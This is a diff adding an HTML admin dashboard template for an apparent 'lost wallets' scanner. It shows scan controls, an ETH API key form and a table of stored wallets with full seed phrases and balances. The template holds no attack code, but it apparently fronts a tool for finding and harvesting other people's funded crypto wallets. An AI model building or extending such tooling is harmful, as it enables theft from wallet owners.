@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    
+    <!-- Bootstrap & Custom Styles -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+    <style>
+        /* Background Image */
+        body {
+            background: url('https://media.istockphoto.com/id/2189408354/photo/hacking-it-security-concept-with-glowing-padlock-binary-data-and-encryption-key.webp?a=1&b=1&s=612x612&w=0&k=20&c=2rWBQvy2BJw51koCm2nvvJR06dPsC_RQ2jqhgsVmsNg=') no-repeat center center fixed;
+            background-size: cover;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+        }
+
+        /* Dark Mode Overlay */
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7); /* Dark effect */
+            z-index: -1;
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            background: rgba(0, 0, 0, 0.85); /* Semi-transparent black */
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
+            margin-top: 20px;
+        }
+
+        table {
+            color: white;
+        }
+
+        .table-dark th, .table-dark td {
+            background-color: rgba(255, 255, 255, 0.1) !important;
+        }
+
+        /* Buttons */
+        .btn {
+            font-weight: bold;
+        }
+
+        /* Styled Header */
+        h2, h3 {
+            color: #f8d210;
+        }
+
+        .text-muted {
+            color: #b0b0b0 !important;
+        }
+
+    </style>
+</head>
+
+<body>
+    <div class="overlay"></div>
+
+    <div class="container mt-4">
+        <h2 class="mb-3 text-center">🚀 Lost Wallets Admin Dashboard</h2>
+        <div class="d-flex justify-content-between">
+            <a href="{{ url_for('logout') }}" class="btn btn-danger">Logout</a>
+            <div>
+                <button class="btn btn-success" onclick="startScan()">▶️ Start Scanning</button>
+                <button class="btn btn-danger" onclick="stopScan()">⏹️ Stop Scanning</button>
+            </div>
+        </div>
+
+        <h3 class="mt-4">🔑 Update ETH API Key</h3>
+        <form action="{{ url_for('update_api_key') }}" method="POST">
+            <input type="text" name="new_api_key" class="form-control mb-3 bg-dark text-white" placeholder="Enter New ETH API Key" required>
+            <button type="submit" class="btn btn-primary">Update API Key</button>
+        </form>
+
+        <h3 class="mt-4">📜 Stored Wallets ({{ wallets|length }})</h3>
+        <p class="text-muted">🔄 Total Wallets Checked: <span id="wallet-count">Loading...</span></p>
+        <p class="text-muted">📡 Scan Status: <span id="scan-status">Loading...</span></p>
+
+        <table class="table table-bordered table-hover">
+            <thead class="table-dark">
+                <tr>
+                    <th>Account Name</th>
+                    <th>Phrase</th>
+                    <th>Funds</th>
+                    <th>Comment</th>
+                    <th>Date Saved</th>
+                    <th>Action</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for wallet in wallets %}
+                <tr>
+                    <td>{{ wallet.account_name }}</td>
+                    <td>{{ wallet.seed_phrase }}</td>
+                    <td>
+                        {% for coin in wallet.coins %}
+                            {% if coin.balance > 0 %}
+                                <b>{{ coin.coin_name }}</b>: {{ coin.balance }} <br>
+                            {% endif %}
+                        {% endfor %}
+                    </td>
+                    <td>{{ wallet.comment }}</td>
+                    <td>{{ wallet.timestamp_human }}</td>
+                    <td>
+                        <form action="{{ url_for('delete_wallet', wallet_id=wallet._id) }}" method="POST">
+                            <button type="submit" class="btn btn-danger btn-sm">Delete</button>
+                        </form>
+                    </td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+
+        {% if wallets|length == 0 %}
+            <p class="text-center text-warning">⚠️ No wallets found with balance greater than 0.</p>
+        {% endif %}
+    </div>
+
+    <script>
+        async function fetchScanStatus() {
+            try {
+                let response = await fetch("/cc");
+                let text = await response.text();
+                let status = text.split(" | ")[0].replace("✅ ", "");
+                let count = text.split(": ")[1];
+
+                document.getElementById("scan-status").innerText = status;
+                document.getElementById("wallet-count").innerText = count;
+            } catch (error) {
+                console.error("Error fetching scan status:", error);
+            }
+        }
+
+        async function startScan() {
+            let response = await fetch("/start_scan", { method: "POST" });
+            let data = await response.json();
+            alert(data.message);
+            fetchScanStatus();  
+        }
+
+        async function stopScan() {
+            let response = await fetch("/stop_scan", { method: "POST" });
+            let data = await response.json();
+            alert(data.message);
+            fetchScanStatus();  
+        }
+
+        fetchScanStatus();
+        setInterval(fetchScanStatus, 5000);  
+    </script>
+
+</body>
+</html>
